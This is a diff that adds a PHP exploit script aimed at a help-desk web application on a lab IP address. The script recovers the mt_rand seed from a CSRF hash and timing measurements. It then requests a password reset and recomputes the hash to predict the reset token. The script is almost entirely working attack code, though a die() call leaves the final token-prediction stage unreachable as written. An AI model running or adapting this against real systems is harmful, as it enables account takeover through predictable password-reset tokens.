@@ -1,0 +1,147 @@
+<?php
+
+function BuildHash()
+{
+	return BuildHashBlock() . BuildHashBlock() . BuildHashBlock() . BuildHashBlock();
+}
+
+/**
+ * Build a Unique Hash Block
+ *
+ * @author John Haugeland
+ * @return string The Hash Block
+ */
+function BuildHashBlock()
+{
+    $sub = mt_rand(0, 36 * 36 * 36);
+	$Ch1to3 = $sub - 1;		// largest alphanum power that'll fit in the minimum guaranteed 16-bit range for mt_randmax()
+    $sec = mt_rand(0, 36 * 36);
+	$Ch4to5 = $sec - 1;
+	$Ch6to8 = hexdec(substr(uniqid(), -6)) % (36 * 36 * 36);  // only want the bottom two characters of entropy, but clip a large range to keep from much influencing probability
+
+	return str_pad(base_convert($Ch1to3, 10, 36), 3, '0', STR_PAD_LEFT) . str_pad(base_convert($Ch4to5, 10, 36), 2, '0', STR_PAD_LEFT) . str_pad(base_convert($Ch6to8, 10, 36), 3, '0', STR_PAD_LEFT);
+}
+
+function getCsrfHashFromPage($page) {
+    preg_match('~name="_csrfhash" value="([^"]*)"~', $page, $matches);
+    return $matches[1];
+}
+
+function getRandsFromHash($block) {
+    $first = base_convert(substr($block, 0, 3), 36, 10) + 1; // mod 46656
+    $second = base_convert(substr($block, 3, 2), 36, 10) + 1; // mod 1296
+    return array($first, $second);
+}
+
+function findSeed($hash, $start, $end) {
+    list($first, $second) = getRandsFromHash($hash);
+    printf("Working from %.6f to %.6f\n", $end, $start);
+    $start_usec = $start * 1e6;
+    $end_usec = $end * 1e6;
+
+    $current_usec = $end_usec;
+    while ($current_usec >= $start_usec) {
+        $seconds = floor($current_usec / 1e6);
+        $usec = ($current_usec % 1e6) / 1e6;
+
+        $seed = (float) $seconds + ((float) $usec * 100000);
+        mt_srand($seed);
+        for ($i = 0; $i < 40; $i++) {
+            if (mt_rand(0, 36 * 36 * 36) == $first && mt_rand(0, 36 * 36) == $second) {
+                return array($seed, $seconds + $usec);
+            }
+        }
+
+        $current_usec -= 1;
+    }
+    die('seed not found');
+}
+
+function timeBetweenUniqid($url) {
+    // We want a new CSRF each time, so don't enable cookies
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+    $times = [];
+
+    for ($i = 0; $i < 10; $i++) {
+        curl_setopt($curl, CURLOPT_URL, $url);
+        $response = curl_exec($curl);
+        $hash = getCsrfHashFromPage($response);
+
+        $prev_time = null;
+        for ($p = 0; $p < 4; $p++) {
+            $time_part = substr($hash, 5 + $p * 8, 3);
+            $time_dec = base_convert($time_part, 36, 10);
+            if ($prev_time) {
+                $times[] = $time_dec - $prev_time;
+            }
+            $prev_time = $time_dec;
+        }
+    }
+    return [min($times), max($times)];
+}
+
+$base_url = 'http://172.16.122.131:8333';
+$reseed_url = $base_url . "/visitor/index.php?/LiveChat/VisitorUpdate/UpdateFootprint/_isFirstTime=0/_sessionID=1";
+$captcha_url = $base_url . "/index.php?/Base/Captcha/GetWordImage";
+$test_url = $base_url . '/test.php';
+$lost_pw_url = $base_url . "/index.php?/Base/UserLostPassword/Index";
+$lost_pw_post = $base_url . "/index.php?/Base/UserLostPassword/Submit";
+
+// Persistent curl object
+$curl = curl_init();
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+// curl_setopt($curl, CURLOPT_PROXY, 'http://172.16.122.128:8080');
+curl_setopt($curl, CURLOPT_COOKIEJAR, '/dev/null');
+
+// Cause mt_srand call and remember about when it happened
+curl_setopt($curl, CURLOPT_URL, $reseed_url);
+$start = microtime(true);
+curl_exec($curl);
+$end = microtime(true);
+
+// print_r(timeBetweenUniqid($base_url));
+
+// Get a valid hash
+curl_setopt($curl, CURLOPT_URL, $base_url);
+$response = curl_exec($curl);
+$hash = getCsrfHashFromPage($response);
+
+// Crack the seed of mt_rand
+list($seed, $time) = findSeed($hash, $start, $end);
+echo "mt_srand called " . ($time - $start). " seconds after call\n";
+die();
+
+// Retrieve page
+curl_setopt($curl, CURLOPT_URL, $lost_pw_url);
+$response = curl_exec($curl);
+
+// Ask for reset password
+curl_setopt($curl, CURLOPT_URL, $lost_pw_post);
+curl_setopt($curl, CURLOPT_POSTFIELDS, 'email=some%40user.com');
+$start = uniqid();
+$response = curl_exec($curl);
+$end = uniqid();
+
+mt_srand($seed);
+for ($i = 0; $i < 42; $i++) {
+    mt_rand();
+}
+echo BuildHash()."\n";
+$mid = dechex((hexdec($end) - hexdec($start)) / 2 + hexdec($start));
+echo "$start $mid $end \n";
+
+$current = $start;
+$possible_time_chars = [];
+while (hexdec($current) <= hexdec($end)) {
+	$Ch6to8 = hexdec(substr($current, -6)) % (36 * 36 * 36);
+	$chars = str_pad(base_convert($Ch6to8, 10, 36), 3, '0', STR_PAD_LEFT);
+    $possible_time_chars[] = $chars;
+
+    $current = dechex(hexdec($current) + 1);
+}
+// $possible_time_chars = array_unique($possible_time_chars);
+// print_r($possible_time_chars);
+echo count($possible_time_chars);
+
